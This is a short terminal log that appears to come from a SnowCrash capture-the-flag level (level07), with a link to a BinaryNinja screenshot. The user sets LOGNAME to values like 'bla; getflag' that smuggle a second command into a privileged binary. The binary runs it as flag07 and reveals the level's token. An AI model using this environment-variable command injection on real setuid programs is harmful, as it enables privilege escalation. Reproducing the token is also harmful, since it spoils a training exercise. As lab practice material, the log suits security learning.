```
level07@SnowCrash:~$ export LOGNAME="bla; ls"
level07@SnowCrash:~$ ./level07 
bla
ls: cannot open directory .: Permission denied
level07@SnowCrash:~$ export LOGNAME="bla; id"
level07@SnowCrash:~$ ./level07 
bla
uid=3007(flag07) gid=2007(level07) groups=3007(flag07),100(users),2007(level07)
level07@SnowCrash:~$ export LOGNAME="bla; getflag"
level07@SnowCrash:~$ ./level07 
bla
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
![BinaryNinja](https://cdn.discordapp.com/attachments/1015186220227231825/1126832842886885417/image.png)
